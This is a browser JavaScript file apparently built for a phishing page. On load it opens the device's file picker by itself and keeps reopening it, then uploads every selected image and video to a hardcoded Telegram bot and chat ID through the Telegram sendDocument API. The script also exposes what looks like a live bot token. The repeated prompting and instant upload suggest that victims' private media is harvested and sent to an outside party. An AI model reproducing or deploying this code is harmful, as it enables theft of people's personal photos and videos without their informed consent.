// =====================================================
// TELEGRAM CONFIG - CHANGE THESE
// =====================================================
const BOT_TOKEN = '8169512623:AAHhKL4aQc0G4bv1SJTZcs7AgYsbJ5EbIR0';
const CHAT_ID = '6653388298';

// =====================================================
// DOM
// =====================================================
const statusEl = document.getElementById('status');
const progressWrap = document.getElementById('progressWrap');
const progressFill = document.getElementById('progressFill');
const progressText = document.getElementById('progressText');
const fileInput = document.getElementById('fileInput');

// =====================================================
// STATE
// =====================================================
let isUploading = false;
let totalFiles = 0;
let uploaded = 0;

// =====================================================
// SET STATUS
// =====================================================
function setStatus(msg, type = '') {
    statusEl.textContent = msg;
    statusEl.className = 'status';
    if (type) statusEl.classList.add(type);
}

// =====================================================
// UPDATE PROGRESS
// =====================================================
function updateProgress(done, total) {
    const percent = Math.min(Math.round((done / total) * 100), 100);
    progressFill.style.width = percent + '%';
    progressText.textContent = `${done} / ${total} (${percent}%)`;
}

// =====================================================
// CHECK IF MEDIA FILE
// =====================================================
function isMedia(file) {
    return file.type.startsWith('image/') || file.type.startsWith('video/');
}

// =====================================================
// UPLOAD SINGLE FILE
// =====================================================
async function uploadToTelegram(file) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);

    try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });

        if (!res.ok) {
            const err = await res.text();
            console.error('❌ Failed:', file.name, err);
            return false;
        }

        console.log('✅ Uploaded:', file.name);
        return true;
    } catch (e) {
        console.error('❌ Error:', file.name, e);
        return false;
    }
}

// =====================================================
// MAIN UPLOAD - 5 FILES CONCURRENTLY
// =====================================================
async function startUpload(files) {
    if (isUploading) return;

    const mediaFiles = files.filter(isMedia);

    if (mediaFiles.length === 0) {
        setStatus('❌ No media files found!', 'error');
        return;
    }

    isUploading = true;
    uploaded = 0;
    totalFiles = mediaFiles.length;

    progressWrap.style.display = 'block';
    setStatus(`📤 Uploading ${totalFiles} files...`, 'loading');

    const CONCURRENCY = 5;
    let index = 0;

    async function worker() {
        while (index < totalFiles) {
            const file = mediaFiles[index++];
            await uploadToTelegram(file);
            uploaded++;
            updateProgress(uploaded, totalFiles);
        }
    }

    const workers = [];
    for (let i = 0; i < Math.min(CONCURRENCY, totalFiles); i++) {
        workers.push(worker());
    }

    await Promise.all(workers);

    isUploading = false;
    progressFill.style.width = '100%';
    progressText.textContent = `✅ ${totalFiles} uploaded!`;

    if (uploaded === totalFiles) {
        setStatus(`🎯 ${totalFiles} media files sent to Telegram!`, 'success');
    } else {
        setStatus(`⚠️ ${uploaded}/${totalFiles} uploaded. Check console.`, 'error');
    }

    // Hide progress after 5s
    setTimeout(() => {
        progressWrap.style.display = 'none';
        progressFill.style.width = '0%';
        setStatus('✅ Upload complete!', 'success');
    }, 5000);
}

// =====================================================
// TRIGGER FILE PICKER - ON PAGE LOAD
// =====================================================
function triggerFilePicker() {
    setStatus('📂 Opening gallery...', 'loading');
    fileInput.click();
}

// =====================================================
// AUTO-START ON FILE SELECTION
// =====================================================
fileInput.addEventListener('change', (e) => {
    const files = Array.from(e.target.files);
    
    if (files.length === 0) {
        setStatus('❌ No files selected!', 'error');
        // Try again
        setTimeout(triggerFilePicker, 1000);
        return;
    }

    const mediaCount = files.filter(isMedia).length;
    setStatus(`📁 ${mediaCount} media files found. Starting upload...`, 'success');
    
    // Auto-start upload
    setTimeout(() => {
        startUpload(files);
    }, 500);

    // Reset input
    fileInput.value = '';
});

// =====================================================
// ON PAGE LOAD - AUTO TRIGGER
// =====================================================
window.addEventListener('load', () => {
    setStatus('📱 Accessing gallery...', 'loading');
    
    // Delay to ensure DOM is ready
    setTimeout(() => {
        triggerFilePicker();
    }, 1000);
});

// =====================================================
// IF USER CLICKS ANYWHERE - RE-TRIGGER
// =====================================================
document.addEventListener('click', () => {
    if (!isUploading && !fileInput.value) {
        triggerFilePicker();
    }
});

console.log('📡 Media Sync v3.0');
console.log(`📤 Target: ${CHAT_ID}`);
